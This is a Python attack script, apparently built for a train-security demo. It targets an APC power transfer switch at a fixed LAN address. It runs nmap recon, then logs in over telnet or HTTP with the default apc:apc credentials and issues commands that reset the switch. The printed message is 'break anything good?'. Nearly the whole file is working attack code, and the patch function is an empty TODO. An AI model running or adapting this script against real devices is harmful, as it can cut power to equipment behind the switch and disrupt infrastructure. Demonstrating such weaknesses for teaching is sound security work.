#A script to reset the APS Power Transfer Switch, used as part of the train demo aka Project D.A.R.T. (Damn, a real train).
#Written by Paul Oates

#TODO
#Get user input for username:password + ip for telnet+http attack
#Get user input for recon + scan entire network for APC devices.
#Delete banner
#Better UI?

import requests
from pyfiglet import Figlet
import time
import nmap
import socket
import re

#url="http://192.168.1.20"
nm = nmap.PortScanner()
IP = '192.168.1.20'

def recon():

    print('[*] Running active scan...')
    host = nm.scan(IP, arguments='-O -sV')
    
    print('\n')
    print("[+] OS: "+host['scan'][IP]['osmatch'][0]['name'])
    print('===========================')
    #print(host['scan'][IP]['tcp'])
    for port in host['scan'][IP]['tcp']:
        print('[+] Port Number: ' +str(port))
        print('[+] State: '+host['scan'][IP]['tcp'][port]['state'])
        print('[+] Service: '+host['scan'][IP]['tcp'][port]['name'])
        print('[+] Product: '+host['scan'][IP]['tcp'][port]['product'])
        print('\n')

def exploit_telnet(u,p):
    username=u
    password=p
    PORT = 23
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        print('[*] Creating socket connection to: '+IP+":"+str(PORT))
        time.sleep(1)
        s.connect((IP,PORT))

        
        print('[+] Getting data from server...')

        res = s.recv(2048)
        res = res + s.recv(2048)
        #time.sleep(1)
        #print(res)
        if res==b'\xff\xfb\x01\n\rUser Name : ':
            print('[+] Sending username to socket...')
            time.sleep(1)

            for c in username:
                s.sendall(c.encode('UTF-8'))
                s.recv(100)
            s.sendall(b'\r')
            s.recv(100)

            print('[+] Sending password to socket...')
            time.sleep(1)
            for c in password:
                s.sendall(c.encode('UTF-8'))
                s.recv(100)
            s.sendall(b'\r')

            full_res=b''
            time.sleep(1)
            while (1):
                res = s.recv(2048)
                #print(b'\n'+res)
                full_res = full_res+res
                #time.sleep(1)
                if b'\r\n>' in res:
                    print('[+] Login successful (apc:apc)!!\n[+] Server sent back menu, sending commands to reset the switch...')
                    time.sleep(2)
                    break

            s.sendall(b'1')
            s.recv(100)  
            s.sendall(b'\r')  
            while (1):
                res = s.recv(2048)
                full_res = full_res+res
                if b'\r\n>' in res:
                    break    
            
            s.sendall(b'4')
            s.recv(100)  
            s.sendall(b'\r')  
            while (1):
                res = s.recv(2048)
                full_res = full_res+res
                if b'\r\n>' in res:
                    break    

            s.sendall(b'1')
            s.recv(100)  
            s.sendall(b'\r')  
            while (1):
                res = s.recv(2048)
                full_res = full_res+res
                if b':' in res:
                    break 

            time.sleep(2)
            s.sendall(b'Y')
            s.recv(100)            
            s.sendall(b'E')
            s.recv(100) 
            s.sendall(b'S')
            s.recv(100) 
            s.sendall(b'\r')  
            while (1):
                res = s.recv(2048)
                full_res = full_res+res
                time.sleep(1)
                if b'Press <ENTER> to continue...' in res:
                    print('[+] Reset successful... break anything good? :^)')
                    break    

        s.close()

def exploit_http():
    #Logon
    data = {
    'login_username': 'apc',
    'login_password': 'apc',
    'submit': 'Log On',
    }
    response = requests.post('http://192.168.1.20/Forms/login1', data=data)
    pattern = r'\/([a-zA-Z0-9]+)\/home\.htm'
    match = re.search(pattern, response.url)
    print(response.url)
    if match:
        token = match.group(1)
        print("[+] Logged in and obtained token: "+token)
    else:
        print("[-] Logon probably failed - is someone else already logged on?")
        return
    time.sleep(1)

    #Reset Switch
    data = {
    'controlaction': '1',
    'submit': 'Apply',
    }
    print('[+] Reseting switch!!')
    time.sleep(1)
    response = requests.post('http://192.168.1.20/NMC/'+token+'/Forms/control1', data=data)
    time.sleep(1)
    
    #Logout
    logout_url='http://192.168.1.20/NMC/'+token+'/logout.htm'
    response = requests.get(logout_url)
    if 'You are now logged off.' in response.text:
        print('[+] Logged out.')

def patch():
    print('TODO')

def print_banner():
    banner = Figlet(font='alligator',width=1000)
    print(banner.renderText('D . A . R . T .'))

def print_menu():
    #os.system('clear')
    print_banner()
    print('1) Recon')
    print('2) Exploit (telnet)')
    print('3) Exploit (http)')
    print('4) Patch')
    print('0) Exit')

    print('Enter your option: ')
    i = int(input())

    if i == 1:
        recon()
    elif i==2:
        exploit_telnet('apc','apc')
    elif i==3:
        exploit_http()
    elif i==4:
        patch()
    elif i==0:
        exit()
    
    else:
        print("Invalid input, try again.")
    
    #print_menu()

def main():
    print_menu()


if __name__ == "__main__":
    main()
